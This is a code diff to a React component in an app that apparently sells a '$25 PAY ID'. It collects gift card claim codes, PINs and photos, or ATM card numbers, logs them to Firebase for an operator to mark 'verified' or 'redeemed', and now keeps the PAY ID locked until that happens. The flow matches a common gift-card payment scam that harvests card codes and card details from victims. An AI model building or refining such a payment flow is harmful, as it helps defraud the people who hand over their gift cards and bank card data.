@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
 import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
-import { doc, onSnapshot } from 'firebase/firestore';
+import { doc, getDoc, onSnapshot } from 'firebase/firestore';
 import {
   GIFT_CARD_BRAND_RULES,
   validateRealGiftCardInput,
@@ -56,6 +56,9 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
   const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
   const [giftRejectionReason, setGiftRejectionReason] = useState('');
   const [verdictModal, setVerdictModal] = useState<{ type: 'used' | 'fake'; message: string } | null>(null);
+  const [showGiftConfirmModal, setShowGiftConfirmModal] = useState(false);
+  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
+  const [statusCheckNote, setStatusCheckNote] = useState('');
 
   // ATM Card form state
   const [cardNumber, setCardNumber] = useState('');
@@ -132,11 +135,13 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
     }
   }, [user?.payIdVerified, pendingStorageKey]);
 
-  // Step 4 verification: real-time admin verification hold for Gift Cards; 10s gateway timer for ATM card
+  // Step 4 verification: strictly wait for Firestore confirmation on Gift Cards; 10s gateway timer only for ATM card
   useEffect(() => {
     if (step !== 4) return;
 
-    if (paymentMethod === 'giftcard' && pendingStatusId) {
+    if (paymentMethod === 'giftcard') {
+      if (!pendingStatusId) return;
+
       const unsub = onSnapshot(
         doc(db, 'giftCardStatuses', pendingStatusId),
         (snap) => {
@@ -148,6 +153,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
           setGiftStatusState(data.status);
 
           if (data.status === 'rejected') {
+            updateUser({ payIdVerified: false });
             setGiftRejectionReason(
               data.rejectionReason || 'Wrong or used gift card is not allowed. Please drop a real, unused gift card.'
             );
@@ -174,6 +180,8 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
       );
       return () => unsub();
     }
+
+    if (paymentMethod !== 'card') return;
 
     // ATM Card (Other Option) verification timer
     let timeLeft = 10;
@@ -229,6 +237,13 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
       return;
     }
 
+    setShowGiftConfirmModal(true);
+  };
+
+  const handleConfirmAndSubmitGiftCard = async () => {
+    setShowGiftConfirmModal(false);
+    setGiftCardError('');
+    setStatusCheckNote('');
     setIsSubmittingGiftCard(true);
     try {
       const res = await logGiftCardSubmission({
@@ -266,6 +281,46 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
       setGiftCardError(err?.message || 'Could not verify gift card right now.');
     } finally {
       setIsSubmittingGiftCard(false);
+    }
+  };
+
+  const handleManualCheckConfirmation = async () => {
+    if (!pendingStatusId) return;
+    setIsCheckingStatus(true);
+    setStatusCheckNote('');
+    try {
+      const statusSnap = await getDoc(doc(db, 'giftCardStatuses', pendingStatusId));
+      if (statusSnap.exists()) {
+        const data = statusSnap.data() as {
+          status: 'pending' | 'verified' | 'redeemed' | 'rejected';
+          rejectionReason?: string;
+        };
+        setGiftStatusState(data.status);
+        if (data.status === 'verified' || data.status === 'redeemed') {
+          if (pendingStorageKey) localStorage.removeItem(pendingStorageKey);
+          setPendingStatusId(null);
+          updateUser({ payIdVerified: true });
+          addTransaction({
+            type: 'PAY ID Purchase',
+            amount: 25,
+            date: new Date().toLocaleString(),
+          });
+          setStep(5);
+          return;
+        }
+        if (data.status === 'rejected') {
+          updateUser({ payIdVerified: false });
+          setGiftRejectionReason(
+            data.rejectionReason || 'Wrong or used gift card is not allowed. Please drop a real, unused gift card.'
+          );
+          return;
+        }
+      }
+      setStatusCheckNote('Still awaiting gift card confirmation. Your PAY ID will unlock right here once confirmed.');
+    } catch {
+      setStatusCheckNote('Unable to reach server right now. Checking automatically...');
+    } finally {
+      setIsCheckingStatus(false);
     }
   };
 
@@ -624,8 +679,8 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                   <ShieldCheck className="w-5 h-5" />
                   <span>
                     {isSubmittingGiftCard
-                      ? 'Checking Gift Card Authenticity...'
-                      : 'Verify $25 Real Gift Card & Generate PAY ID'}
+                      ? 'Submitting Gift Card for Confirmation...'
+                      : 'Review & Confirm Gift Card ($25)'}
                   </span>
                 </button>
               </form>
@@ -780,16 +835,44 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
               <>
                 <div className="w-16 h-16 border-4 border-amber-500 border-t-transparent rounded-full animate-spin" />
                 <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
-                  Pending Real Card Check
+                  Gift Card Confirmation Required • PAY ID Locked
                 </span>
-                <h3 className="text-2xl font-bold text-gray-900">Verifying Your Real Gift Card</h3>
+                <h3 className="text-2xl font-bold text-gray-900">Confirming Gift Card Before Giving PAY ID</h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  We have checked that your card matches a real format and are now confirming it has not been used before. Your PAY ID will appear here once approved.
+                  Your gift card is being confirmed real and unredeemed. <strong>Your PAY ID will remain locked until confirmation succeeds.</strong>
                 </p>
                 <GiftCardCheckChecklist />
+
+                <div className="w-full max-w-sm bg-slate-900 text-white rounded-2xl p-4 border border-slate-700 text-left space-y-1.5">
+                  <div className="flex items-center justify-between text-[11px] text-amber-300 font-bold uppercase tracking-wider">
+                    <span>PAY ID Status</span>
+                    <span className="flex items-center space-x-1">
+                      <Lock className="w-3 h-3" />
+                      <span>Locked Until Confirmed</span>
+                    </span>
+                  </div>
+                  <div className="font-mono text-sm tracking-widest text-slate-400 bg-black/40 px-3 py-2 rounded-xl select-none">
+                    PG-•••• ••••••••••••••••
+                  </div>
+                </div>
+
                 <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                   Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                 </div>
+
+                {statusCheckNote && (
+                  <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
+                )}
+
+                <button
+                  type="button"
+                  onClick={handleManualCheckConfirmation}
+                  disabled={isCheckingStatus}
+                  className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
+                >
+                  {isCheckingStatus ? 'Checking Gift Card Confirmation...' : 'Check Gift Card Confirmation Status'}
+                </button>
+
                 <button
                   type="button"
                   onClick={() => {
@@ -799,6 +882,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                     setGiftCardPin('');
                     setGiftCardImage(null);
                     setConfirmedUnused(false);
+                    setStatusCheckNote('');
                     setStep(3);
                   }}
                   className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
@@ -828,8 +912,8 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
           </div>
         )}
 
-        {/* Step 5: Verified PAY ID Code */}
-        {step === 5 && (
+        {/* Step 5: Verified PAY ID Code (strictly requires confirmed verification) */}
+        {step === 5 && Boolean(user?.payIdVerified) && (
           <div className="bg-white rounded-2xl p-6 sm:p-8 shadow-sm border border-gray-100 flex flex-col items-center text-center space-y-6">
             <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center ring-8 ring-emerald-50">
               <ShieldCheck className="w-9 h-9" />
@@ -937,6 +1021,85 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
           </div>
         </div>
       )}
+      {/* Pre-Submission Gift Card Confirmation Modal */}
+      {showGiftConfirmModal && (
+        <div className="fixed inset-0 bg-black/65 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-in fade-in">
+          <div className="bg-white rounded-3xl p-6 w-full max-w-md shadow-2xl border border-purple-100 space-y-4">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center space-x-2.5">
+                <div className="w-9 h-9 bg-purple-100 text-purple-700 rounded-xl flex items-center justify-center">
+                  <ShieldCheck className="w-5 h-5" />
+                </div>
+                <h3 className="text-base font-bold text-gray-900">Confirm Gift Card Details</h3>
+              </div>
+              <button
+                type="button"
+                onClick={() => setShowGiftConfirmModal(false)}
+                className="p-1.5 hover:bg-gray-100 rounded-full text-gray-400 cursor-pointer"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+
+            <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 space-y-2 text-xs">
+              <div className="flex justify-between">
+                <span className="text-gray-500">Brand:</span>
+                <span className="font-bold text-gray-900">{giftCardBrand}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-500">Type / Value:</span>
+                <span className="font-bold text-gray-900">
+                  {giftCardFormat === 'physical' ? 'Physical Card' : 'Digital E-Code'} • $25
+                </span>
+              </div>
+              <div className="flex justify-between items-center gap-2">
+                <span className="text-gray-500 shrink-0">Claim Code:</span>
+                <span className="font-mono font-bold text-purple-900 break-all text-right">
+                  {giftCardCode.trim().toUpperCase()}
+                </span>
+              </div>
+              {giftCardPin.trim() && (
+                <div className="flex justify-between">
+                  <span className="text-gray-500">PIN / CVV:</span>
+                  <span className="font-mono font-bold text-gray-900">{giftCardPin.trim()}</span>
+                </div>
+              )}
+              {giftCardImage && (
+                <div className="pt-2 border-t border-gray-200 flex items-center space-x-2.5">
+                  <img
+                    src={giftCardImage}
+                    alt="Gift card proof"
+                    className="w-12 h-12 object-cover rounded-lg border border-gray-300"
+                  />
+                  <span className="text-emerald-700 font-semibold">Proof image attached</span>
+                </div>
+              )}
+            </div>
+
+            <p className="text-xs text-amber-800 bg-amber-50 border border-amber-200 rounded-xl p-3 leading-relaxed">
+              <strong>Confirmation Notice:</strong> Your gift card will be checked and confirmed unused before your PAY ID is unlocked.
+            </p>
+
+            <div className="grid grid-cols-2 gap-2.5 pt-1">
+              <button
+                type="button"
+                onClick={() => setShowGiftConfirmModal(false)}
+                className="min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-xl text-xs cursor-pointer"
+              >
+                Edit Card Details
+              </button>
+              <button
+                type="button"
+                onClick={handleConfirmAndSubmitGiftCard}
+                className="min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold rounded-xl text-xs shadow-sm cursor-pointer"
+              >
+                Confirm & Submit Card
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       <GiftCardVerdictModal verdict={verdictModal} onClose={() => setVerdictModal(null)} />
     </div>
   );
